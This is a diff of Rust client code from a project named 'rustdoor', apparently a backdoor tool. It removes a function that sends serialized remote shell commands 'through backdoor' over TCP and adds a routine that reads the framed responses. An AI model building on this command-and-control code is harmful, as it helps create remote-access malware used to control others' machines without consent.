@@ -8,21 +8,6 @@ use rustdoor::communication::messages::{
 };
 use rustdoor::communication::serialization::get_msg_type_and_length;
 
-fn make_run_command_request_buffer(command: String, async_run: bool) -> Vec<u8> {
-    let req = RunCommandRequest { command, async_run };
-    let serialized_message = ron::ser::to_string(&req).unwrap();
-
-    let message_type = MessageType::RunCommandType as u8;
-    let message_len = serialized_message.len();
-
-    let mut buffer: Vec<u8> =
-        Vec::with_capacity(message_len + MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE);
-    buffer.push(message_type);
-    buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
-    buffer.extend(serialized_message.into_bytes());
-    buffer
-}
-
 fn handle_response(message: &[u8], msg_type: u8) {
     println!("Response got: {:?}", message);
     if msg_type == MessageType::RunCommandType as u8 {
@@ -33,14 +18,7 @@ fn handle_response(message: &[u8], msg_type: u8) {
     }
 }
 
-pub fn run_command(command: String, mut stream: &TcpStream) -> Result<(), Error> {
-    println!("Running command {} through backdoor.", command);
-    let msg = make_run_command_request_buffer(command, false);
-
-    println!("Sending buffer {:?}", msg);
-    stream.write(&msg).unwrap();
-    println!("Sent message, awaiting reply...");
-
+pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
     let mut type_and_length = [0 as u8; MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE];
     while match stream.read(&mut type_and_length) {
         Ok(size) => match size {
@@ -59,7 +37,7 @@ pub fn run_command(command: String, mut stream: &TcpStream) -> Result<(), Error>
         },
         Err(e) => {
             println!(
-                "An error occurred, terminating connection with {}. Error: {}",
+                "An error occurred while getting response, terminating connection with {}. Error: {}",
                 stream.peer_addr()?,
                 e
             );
